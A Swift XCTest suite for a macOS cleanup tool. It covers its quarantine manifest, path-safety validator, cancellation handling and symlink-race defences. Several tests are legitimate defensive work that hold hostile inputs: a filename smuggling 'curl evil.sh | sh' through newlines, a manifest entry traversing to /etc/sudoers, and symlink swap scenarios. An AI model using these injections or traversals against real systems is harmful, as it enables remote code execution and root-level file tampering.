import XCTest
import Darwin

// MARK: - 1.0.1 behaviour

/// Tests for the accuracy and presentation work added in 1.0.1. Each one
/// pins a behaviour that was wrong, missing, or unverifiable in 1.0.0.
final class ImprovementTests: XCTestCase {

    // MARK: Byte formatting

    /// "Zero KB" is `ByteCountFormatter`'s wording and reads as a bug in a
    /// column of sizes.
    func testZeroRendersAsZeroKB() {
        XCTAssertEqual(SWPBytes.string(0), "0 KB")
        XCTAssertEqual(SWPBytes.string(-1), "0 KB")
    }

    // MARK: Live identifiers

    /// A package receipt or a loaded launchd job keeps a vendor alive even
    /// when no `.app` exists — the Paragon/Razer shape. Without this, driver
    /// vendors read as orphaned.
    func testReceiptAndDaemonIdentifiersKeepVendorsAlive() {
        let inventory = SWPAppInventory.fixture(
            bundleIDs: Set((0..<40).map { "com.filler.app\($0)" }),
            liveIdentifiers: ["com.paragon-software.ntfs",
                              "com.crystalidea.macsfancontrol.smcwrite"],
            appCount: 60)

        XCTAssertTrue(inventory.owns("com.paragon-software.ntfs"))
        XCTAssertTrue(inventory.owns("com.paragon-software.ntfs.notification-agent"),
                      "a helper under a live vendor prefix must count as owned")
        XCTAssertTrue(inventory.owns("com.crystalidea.macsfancontrol"))
        XCTAssertFalse(inventory.owns("com.vanished.tool"))
    }

    /// Live identifiers are a *keep* signal only: they must never make an
    /// unrelated vendor look installed.
    func testLiveIdentifiersDoNotOverReach() {
        let inventory = SWPAppInventory.fixture(
            bundleIDs: Set((0..<40).map { "com.filler.app\($0)" }),
            liveIdentifiers: ["com.acme.driver"],
            appCount: 60)
        XCTAssertFalse(inventory.owns("com.acmecorp.other"))
        XCTAssertFalse(inventory.owns("com.other.acme"))
    }

    // MARK: Quarantine manifest

    /// The manifest is what makes an authorised removal reversible; parsing it
    /// must survive paths containing spaces.
    func testManifestRoundTrip() throws {
        let folder = try removalFixture()
        defer { try? FileManager.default.removeItem(at: folder) }

        let quarantined = folder.appendingPathComponent("Some Daemon.plist")
        try Data().write(to: quarantined)
        let manifest = folder.appendingPathComponent(SWPRemovalService.manifestName)
        try("# header\nSome Daemon.plist\t/Library/LaunchDaemons/Some Daemon.plist\n"
            + "Missing.plist\t/Library/LaunchDaemons/Missing.plist\n")
            .write(to: manifest, atomically: true, encoding: .utf8)

        let entries = SWPRemovalService.entries(in: folder)
        XCTAssertEqual(entries.count, 1, "entries whose quarantined file is gone are skipped")
        XCTAssertEqual(entries.first?.original.path,
                       "/Library/LaunchDaemons/Some Daemon.plist")
    }

    // MARK: Cancellation

    /// The bug this pins: `Task.detached` does not inherit cancellation, so a
    /// scanner's `Task.isCancelled` checks are dead unless the detached child
    /// is cancelled explicitly. This asserts the bridge works — cancel the
    /// outer task, and work inside the detached child observes it.
    func testDetachedWorkObservesOuterCancellation() async {
        let observed = SWPCancellationProbe()

        let outer = Task {
            let work = Task.detached { () -> Bool in
                // Spin until cancelled, exactly like a directory walk.
                for _ in 0..<2_000 {
                    if Task.isCancelled { return true }
                    try? await Task.sleep(nanoseconds: 1_000_000)
                }
                return false
            }
            let sawCancellation = await withTaskCancellationHandler {
                await work.value
            } onCancel: {
                work.cancel()
            }
            await observed.set(sawCancellation)
        }

        try? await Task.sleep(nanoseconds: 50_000_000)
        outer.cancel()
        _ = await outer.value

        let sawCancellation = await observed.value
        XCTAssertTrue(sawCancellation,
                      "detached work must observe cancellation forwarded by the handler")
    }

    /// Control: without the handler the detached child never sees it. If this
    /// ever starts failing, Swift changed and the bridge may be removable.
    func testDetachedWorkIgnoresCancellationWithoutTheBridge() async {
        let observed = SWPCancellationProbe()

        let outer = Task {
            let work = Task.detached { () -> Bool in
                for _ in 0..<120 {
                    if Task.isCancelled { return true }
                    try? await Task.sleep(nanoseconds: 1_000_000)
                }
                return false
            }
            await observed.set(await work.value)
        }

        try? await Task.sleep(nanoseconds: 20_000_000)
        outer.cancel()
        _ = await outer.value

        let sawCancellation = await observed.value
        XCTAssertFalse(sawCancellation,
                       "detached tasks do not inherit cancellation — this is why the bridge exists")
    }

    // MARK: Running processes

    /// The third keep-signal: a running process proves its app is installed.
    func testRunningBundleIDsCountAsLiveIdentifiers() {
        let inventory = SWPAppInventory.fixture(
            bundleIDs: Set((0..<40).map { "com.filler.app\($0)" }),
            liveIdentifiers: ["com.running.app"],
            appCount: 60)
        XCTAssertTrue(inventory.owns("com.running.app"))
        XCTAssertTrue(inventory.owns("com.running.app.helper"))
    }

    // MARK: Control characters

    /// Control characters are rejected before filenames can enter a privileged
    /// command or a tab-delimited recovery manifest.
    func testControlCharactersInPathsAreRefused() {
        let caches = URL(fileURLWithPath: NSHomeDirectory())
            .appendingPathComponent("Library/Caches")
        // NUL is deliberately absent: it terminates a C string, so no real
        // file can carry it, and Foundation percent-encodes it into the inert
        // literal "%00" before the policy ever sees it.
        for name in ["Evil\nSWPMANIFEST\ncurl evil.sh | sh",
                     "tab\tseparated",
                     "carriage\rreturn",
                     "vertical\u{0B}tab"] {
            let url = caches.appendingPathComponent(name)
            XCTAssertFalse(SWPSafety.validate(url).isAllowed,
                           "must refuse a path containing control characters")
        }
        // A perfectly ordinary name with spaces and unicode stays allowed.
        XCTAssertTrue(SWPSafety.validate(
            caches.appendingPathComponent("Some Vendor — café")).isAllowed)
    }

    // MARK: Quarantine manifest source validation

    /// The audit found a local privilege escalation: `restore()` validated the
    /// manifest's DESTINATION but not its SOURCE, so a crafted manifest naming
    /// `../../../../etc/sudoers` had the authorised batch `mv` that file as
    /// root. The source must be a single file name inside the folder.
    func testManifestSourceEscapesAreRejected() throws {
        let folder = try removalFixture()
        defer { try? FileManager.default.removeItem(at: folder) }

        let legit = folder.appendingPathComponent("real.plist")
        try Data().write(to: legit)

        let manifest = folder.appendingPathComponent(SWPRemovalService.manifestName)
        try("""
        # header
        ../../../../../../../../etc/sudoers\t/Users/x/Library/Caches/a
        sub/dir/file\t/Users/x/Library/Caches/b
        ..\t/Users/x/Library/Caches/c
        real.plist\t/Users/x/Library/Caches/real.plist
        """).write(to: manifest, atomically: true, encoding: .utf8)

        let entries = SWPRemovalService.entries(in: folder)
        XCTAssertEqual(entries.count, 1, "only the in-folder entry may survive")
        XCTAssertEqual(entries.first?.quarantined.lastPathComponent, "real.plist")
    }

    // MARK: Policy for the new developer sources

    /// The dot-roots must sit one level above what the scanners offer, or the
    /// "never remove a root itself" rule silently drops these targets.
    func testDeveloperCachePathsAreRemovableButTheirRootsAreNot() {
        let home = URL(fileURLWithPath: NSHomeDirectory())
        for path in [".gradle/caches", ".npm/_cacache",
                     "Library/Developer/Xcode/UserData/Previews",
                     "Library/Caches/CocoaPods"] {
            XCTAssertTrue(SWPSafety.validate(home.appendingPathComponent(path)).isAllowed,
                          "must allow ~/\(path)")
        }
        for root in [".gradle", ".npm"] {
            XCTAssertFalse(SWPSafety.validate(home.appendingPathComponent(root)).isAllowed,
                           "must refuse the root ~/\(root)")
        }
    }

    // MARK: Quarantine boundaries

    func testBatchNamesAndManifestNamesNeverCollide() {
        let batches = (0..<100).map { _ in SWPRemovalService.quarantinePath() }
        XCTAssertEqual(Set(batches).count, batches.count)
        for batch in batches {
            XCTAssertNotNil(UUID(uuidString: String(batch.suffix(36))))
        }
        let items = ["sweep-manifest.tsv", "SWEEP-MANIFEST.TSV", "sweep-manifest 2.tsv"].map {
            SWPItem(url: URL(fileURLWithPath: "/Library/Caches/" + $0),
                    sizeBytes: 0, modified: nil, location: "", requiresAdmin: true)
        }
        let names = SWPRemovalService.quarantineNames(for: items).map { $0.lowercased() }
        XCTAssertEqual(Set(names).count, names.count)
        XCTAssertFalse(names.contains(SWPRemovalService.manifestName))
    }

    func testGeneratedMoveRecordsOnlyVerifiedMovesAndPreservesManifestNamedSource() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("sweep-manifest.tsv")
        let quarantine = fixture.appendingPathComponent("quarantine")
        try FileManager.default.createDirectory(at: quarantine, withIntermediateDirectories: false)
        try Data("original".utf8).write(to: source)
        let manifest = quarantine.appendingPathComponent(SWPRemovalService.manifestName)
        try Data("# header\n".utf8).write(to: manifest)
        let item = SWPItem(url: source, sizeBytes: 8, modified: nil, location: "", requiresAdmin: true)
        let name = try XCTUnwrap(SWPRemovalService.quarantineNames(for: [item]).first)
        let identity = try SWPRemovalService.fileIdentity(source)
        let output = try runMoveFixture(
            source: source.path, destination: "./" + name, identity: identity,
            manifestRow: name + "\t" + source.path, cwd: quarantine)
        XCTAssertEqual(SWPRemovalService.completedIndices(in: output), [0])
        XCTAssertFalse(FileManager.default.fileExists(atPath: source.path))
        XCTAssertEqual(try String(contentsOf: quarantine.appendingPathComponent(name), encoding: .utf8), "original")
        XCTAssertEqual(SWPRemovalService.entries(in: quarantine).map(\.original.path), [source.path])

        let manifestBefore = try Data(contentsOf: manifest)
        let missingOutput = try runMoveFixture(
            source: source.path, destination: "./missing", identity: identity,
            manifestRow: "missing\t" + source.path, cwd: quarantine)
        XCTAssertTrue(SWPRemovalService.completedIndices(in: missingOutput).isEmpty)
        XCTAssertEqual(try Data(contentsOf: manifest), manifestBefore)
    }

    /// `do shell script` returns `\r`-separated output by default. A batch of
    /// several verified moves must still report every index as completed.
    func testCompletedIndicesSurviveDoShellScriptLineEndings() throws {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/osascript")
        process.arguments = ["-e", "do shell script \"echo SWPOK:0; echo SWPOK:1; echo SWPOK:2\""]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        let output = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        process.waitUntilExit()
        XCTAssertTrue(output.contains("\r"), "precondition: osascript still rewrites line endings")
        XCTAssertEqual(SWPRemovalService.completedIndices(in: output), [0, 1, 2])
    }

    func testGeneratedRestoreRefusesExistingFilesDirectoriesAndDanglingLinks() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("quarantined")
        try Data("quarantined bytes".utf8).write(to: source)
        let identity = try SWPRemovalService.fileIdentity(source)
        let file = fixture.appendingPathComponent("existing-file")
        let directory = fixture.appendingPathComponent("existing-directory")
        let link = fixture.appendingPathComponent("existing-link")
        try Data("keep".utf8).write(to: file)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: false)
        try FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "missing")
        for destination in [file, directory, link] {
            let output = try runMoveFixture(source: source.path, destination: destination.path,
                                            identity: identity, cwd: fixture)
            XCTAssertTrue(SWPRemovalService.completedIndices(in: output).isEmpty)
            XCTAssertEqual(try String(contentsOf: source, encoding: .utf8), "quarantined bytes")
        }
        XCTAssertEqual(try String(contentsOf: file, encoding: .utf8), "keep")
        XCTAssertTrue(try FileManager.default.contentsOfDirectory(atPath: directory.path).isEmpty)
        XCTAssertEqual(try FileManager.default.destinationOfSymbolicLink(atPath: link.path), "missing")
    }

    func testGeneratedMoveRefusesReplacedSource() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("source")
        let held = fixture.appendingPathComponent("reviewed-source")
        let destination = fixture.appendingPathComponent("destination")
        try Data("reviewed".utf8).write(to: source)
        let identity = try SWPRemovalService.fileIdentity(source)
        try FileManager.default.moveItem(at: source, to: held)
        try Data("replacement".utf8).write(to: source)
        let output = try runMoveFixture(source: source.path, destination: destination.path,
                                        identity: identity, cwd: fixture)
        XCTAssertTrue(SWPRemovalService.completedIndices(in: output).isEmpty)
        XCTAssertFalse(FileManager.default.fileExists(atPath: destination.path))
        XCTAssertEqual(try String(contentsOf: source, encoding: .utf8), "replacement")
        XCTAssertEqual(try String(contentsOf: held, encoding: .utf8), "reviewed")
    }

    func testNativeRestoreNeverClobbersAndMovesOnlyToVacantDestination() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("source")
        let destination = fixture.appendingPathComponent("original")
        try Data("restore".utf8).write(to: source)
        try Data("keep".utf8).write(to: destination)
        XCTAssertThrowsError(try SWPRemovalService.moveExclusively(from: source, to: destination))
        XCTAssertEqual(try String(contentsOf: source, encoding: .utf8), "restore")
        XCTAssertEqual(try String(contentsOf: destination, encoding: .utf8), "keep")
        try FileManager.default.removeItem(at: destination)
        try SWPRemovalService.moveExclusively(from: source, to: destination)
        XCTAssertFalse(FileManager.default.fileExists(atPath: source.path))
        XCTAssertEqual(try String(contentsOf: destination, encoding: .utf8), "restore")
    }

    func testManifestRejectsReservedSourcesLinksAndDuplicateEntries() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("real")
        try Data().write(to: source)
        try FileManager.default.createSymbolicLink(atPath: fixture.appendingPathComponent("link").path,
                                                  withDestinationPath: source.path)
        let manifest = fixture.appendingPathComponent(SWPRemovalService.manifestName)
        try """
        sweep-manifest.tsv\t/Library/LaunchDaemons/manifest.plist
        SWEEP-MANIFEST.TSV\t/Library/LaunchDaemons/upper.plist
        link\t/Library/LaunchDaemons/link.plist
        real\t/Library/LaunchDaemons/real.plist
        real\t/Library/LaunchDaemons/duplicate.plist
        """.write(to: manifest, atomically: true, encoding: .utf8)
        XCTAssertEqual(SWPRemovalService.entries(in: fixture).map(\.original.path),
                       ["/Library/LaunchDaemons/real.plist"])
        try FileManager.default.removeItem(at: manifest)
        try FileManager.default.createSymbolicLink(atPath: manifest.path, withDestinationPath: source.path)
        XCTAssertTrue(SWPRemovalService.entries(in: fixture).isEmpty)
    }

    func testManifestPreservesHashPrefixedFileNames() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        try Data("recoverable".utf8).write(to: fixture.appendingPathComponent("#agent.plist"))
        try "# header\n#agent.plist\t/Library/LaunchDaemons/agent.plist\n"
            .write(to: fixture.appendingPathComponent(SWPRemovalService.manifestName), atomically: true, encoding: .utf8)
        let entries = SWPRemovalService.entries(in: fixture)
        XCTAssertEqual(entries.map(\.quarantined.lastPathComponent), ["#agent.plist"])
        XCTAssertEqual(entries.map(\.original.path), ["/Library/LaunchDaemons/agent.plist"])
    }

    // MARK: Descriptor-bound user removal

    func testUserRemovalCannotFollowReplacedIntermediateAncestor() throws {
        try verifyBoundAncestorSwap(isApplication: false)
    }

    func testApplicationRemovalCannotFollowReplacedIntermediateAncestor() throws {
        try verifyBoundAncestorSwap(isApplication: true)
    }

    private func verifyBoundAncestorSwap(isApplication: Bool) throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let manager = FileManager.default
        let selected = fixture.appendingPathComponent("selected")
        let protected = fixture.appendingPathComponent("protected")
        let held = fixture.appendingPathComponent("held")
        let name = isApplication ? "Example.app" : "report"
        let source = selected.appendingPathComponent("nested/" + name)
        let victim = protected.appendingPathComponent("nested/" + name)
        for parent in [source.deletingLastPathComponent(), victim.deletingLastPathComponent()] {
            try manager.createDirectory(at: parent, withIntermediateDirectories: true)
        }
        if isApplication {
            try manager.createDirectory(at: source, withIntermediateDirectories: false)
            try manager.createDirectory(at: victim, withIntermediateDirectories: false)
        }
        let sourceData = isApplication ? source.appendingPathComponent("payload") : source
        let victimData = isApplication ? victim.appendingPathComponent("payload") : victim
        try Data("reviewed".utf8).write(to: sourceData)
        try Data("unreviewed".utf8).write(to: victimData)
        let bound = try SWPRemovalService.BoundSource(source)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        try manager.moveItem(at: selected, to: held)
        try manager.createSymbolicLink(at: selected, withDestinationURL: protected)

        try quarantine.move(bound, name: name)

        let destination = quarantine.url.appendingPathComponent(name)
        let destinationData = isApplication ? destination.appendingPathComponent("payload") : destination
        XCTAssertEqual(try Data(contentsOf: destinationData), Data("reviewed".utf8))
        XCTAssertEqual(try Data(contentsOf: victimData), Data("unreviewed".utf8))
        XCTAssertFalse(manager.fileExists(atPath: held.appendingPathComponent("nested/" + name).path))
        XCTAssertEqual(SWPRemovalService.entries(in: quarantine.url).map(\.original.path), [source.path])
        XCTAssertThrowsError(try SWPRemovalService.moveExclusively(from: destination, to: source))
        XCTAssertEqual(try Data(contentsOf: victimData), Data("unreviewed".utf8))
    }

    func testUserRemovalRejectsAncestorLinkedBeforeBinding() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let directory = fixture.appendingPathComponent("directory")
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: false)
        let source = directory.appendingPathComponent("source")
        try Data("keep".utf8).write(to: source)
        let link = fixture.appendingPathComponent("linked")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: directory)
        do {
            let bound = try SWPRemovalService.BoundSource(link.appendingPathComponent("source"))
            XCTFail("A linked ancestor was accepted: \(bound.url.path)")
        } catch {
            XCTAssertEqual(try Data(contentsOf: source), Data("keep".utf8))
        }
    }

    func testBoundUserRemovalRefusesReplacedLeaf() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("source")
        let held = fixture.appendingPathComponent("held")
        try Data("reviewed".utf8).write(to: source)
        let bound = try SWPRemovalService.BoundSource(source)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        try FileManager.default.moveItem(at: source, to: held)
        try Data("replacement".utf8).write(to: source)
        XCTAssertThrowsError(try quarantine.move(bound, name: "source"))
        XCTAssertEqual(try Data(contentsOf: source), Data("replacement".utf8))
        XCTAssertEqual(try Data(contentsOf: held), Data("reviewed".utf8))
        XCTAssertTrue(SWPRemovalService.entries(in: quarantine.url).isEmpty)
    }

    func testFailedBoundMoveDoesNotMakeUnrelatedDestinationRestorable() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("source")
        try Data("reviewed".utf8).write(to: source)
        let bound = try SWPRemovalService.BoundSource(source)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        let destination = quarantine.url.appendingPathComponent("source")
        try Data("keep".utf8).write(to: destination)
        XCTAssertThrowsError(try quarantine.move(bound, name: "source"))
        XCTAssertEqual(try Data(contentsOf: source), Data("reviewed".utf8))
        XCTAssertEqual(try Data(contentsOf: destination), Data("keep".utf8))
        XCTAssertTrue(SWPRemovalService.entries(in: quarantine.url).isEmpty,
                      "An intent row must not authorize restoring an unrelated inode")
    }

    func testUserRemovalRefusesReplacedQuarantineDirectory() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("source")
        try Data("reviewed".utf8).write(to: source)
        let bound = try SWPRemovalService.BoundSource(source)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        let held = fixture.appendingPathComponent("held-quarantine")
        try FileManager.default.moveItem(at: quarantine.url, to: held)
        try FileManager.default.createDirectory(at: quarantine.url, withIntermediateDirectories: false)
        XCTAssertThrowsError(try quarantine.move(bound, name: "source"))
        XCTAssertEqual(try Data(contentsOf: source), Data("reviewed".utf8))
        XCTAssertFalse(FileManager.default.fileExists(atPath: held.appendingPathComponent("source").path))
        XCTAssertTrue(SWPRemovalService.entries(in: quarantine.url).isEmpty)
    }

    func testIdentityManifestDoesNotOfferReplacedPayloadForRestore() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let source = fixture.appendingPathComponent("source")
        try Data("reviewed".utf8).write(to: source)
        let bound = try SWPRemovalService.BoundSource(source)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        try quarantine.move(bound, name: "source")
        let destination = quarantine.url.appendingPathComponent("source")
        let held = fixture.appendingPathComponent("held")
        try FileManager.default.moveItem(at: destination, to: held)
        try Data("replacement".utf8).write(to: destination)
        XCTAssertTrue(SWPRemovalService.entries(in: quarantine.url).isEmpty)
        XCTAssertEqual(try Data(contentsOf: held), Data("reviewed".utf8))
        XCTAssertEqual(try Data(contentsOf: destination), Data("replacement".utf8))
    }

    func testPermittedCacheAliasMovesOnlyTheLink() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let target = fixture.appendingPathComponent("target")
        try Data("keep target".utf8).write(to: target)
        let link = fixture.appendingPathComponent("alias")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: target)
        let bound = try SWPRemovalService.BoundSource(link, allowSymbolicLink: true)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        try quarantine.move(bound, name: "alias")
        XCTAssertEqual(try FileManager.default.destinationOfSymbolicLink(
            atPath: quarantine.url.appendingPathComponent("alias").path), target.path)
        XCTAssertEqual(try Data(contentsOf: target), Data("keep target".utf8))
        XCTAssertFalse(FileManager.default.fileExists(atPath: link.path))
    }

    func testOwnedHomebrewCacheAliasCanBeDiscoveredAndRestored() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let home = fixture.appendingPathComponent("home")
        let cache = home.appendingPathComponent("Library/Caches/Homebrew")
        let downloads = cache.appendingPathComponent("downloads")
        try FileManager.default.createDirectory(at: downloads, withIntermediateDirectories: true)
        let name = String(repeating: "a", count: 64) + "--ollama-1.2.3.tar.gz"
        let target = downloads.appendingPathComponent(name)
        try Data("keep download".utf8).write(to: target)
        let alias = cache.appendingPathComponent("ollama--1.2.3")
        let linkText = "downloads/" + name
        try FileManager.default.createSymbolicLink(atPath: alias.path, withDestinationPath: linkText)
        XCTAssertTrue(SWPSafety.validateLocalAI(alias, product: .ollama, home: home).isAllowed)
        let bound = try SWPRemovalService.BoundSource(alias, allowSymbolicLink: true)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        try quarantine.move(bound, name: alias.lastPathComponent)
        XCTAssertEqual(SWPRemovalService.entries(in: quarantine.url, home: home).map(\.original.path), [alias.path])
        let result = SWPRemovalService().restore(from: quarantine.url, home: home)
        XCTAssertEqual(result.restored, 1)
        XCTAssertEqual(result.failed, 0)
        XCTAssertFalse(result.cancelled)
        XCTAssertEqual(try FileManager.default.destinationOfSymbolicLink(atPath: alias.path), linkText)
        XCTAssertEqual(try Data(contentsOf: target), Data("keep download".utf8))
        XCTAssertTrue(SWPRemovalService.entries(in: quarantine.url, home: home).isEmpty)
    }

    func testIdentityManifestCannotRestoreAnUnownedAliasTarget() throws {
        let fixture = try removalFixture()
        defer { try? FileManager.default.removeItem(at: fixture) }
        let home = fixture.appendingPathComponent("home")
        let cache = home.appendingPathComponent("Library/Caches/Homebrew")
        try FileManager.default.createDirectory(at: cache, withIntermediateDirectories: true)
        let target = fixture.appendingPathComponent("protected")
        try Data("keep".utf8).write(to: target)
        let alias = cache.appendingPathComponent("ollama--1.2.3")
        try FileManager.default.createSymbolicLink(at: alias, withDestinationURL: target)
        let bound = try SWPRemovalService.BoundSource(alias, allowSymbolicLink: true)
        let quarantine = try SWPRemovalService.UserQuarantine(at: fixture.appendingPathComponent("quarantine"))
        try quarantine.move(bound, name: alias.lastPathComponent)
        XCTAssertTrue(SWPRemovalService.entries(in: quarantine.url, home: home).isEmpty)
        XCTAssertEqual(try Data(contentsOf: target), Data("keep".utf8))
        XCTAssertFalse(FileManager.default.fileExists(atPath: alias.path))
    }

    private func removalFixture() throws -> URL {
        guard let physical = realpath(NSTemporaryDirectory(), nil) else {
            throw NSError(domain: NSPOSIXErrorDomain, code: Int(errno))
        }
        defer { free(physical) }
        let folder = URL(fileURLWithPath: String(cString: physical), isDirectory: true)
            .appendingPathComponent("sweep-boundary-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
        return folder
    }

    private func runMoveFixture(source: String, destination: String, identity: String,
                                manifestRow: String? = nil, cwd: URL) throws -> String {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.currentDirectoryURL = cwd
        process.arguments = ["-c", SWPRemovalService.commandPrelude + "\n"
            + SWPRemovalService.moveCommand(source: source, destination: destination,
                                             identity: identity, index: 0, manifestRow: manifestRow)]
        let output = Pipe()
        process.standardOutput = output
        process.standardError = FileHandle.nullDevice
        try process.run()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        XCTAssertEqual(process.terminationStatus, 0)
        return String(decoding: data, as: UTF8.self)
    }
}

// MARK: - Probe

/// Actor box so the async cancellation tests can record a result without
/// tripping over concurrent access.
private actor SWPCancellationProbe {
    private(set) var value = false
    func set(_ newValue: Bool) { value = newValue }
}
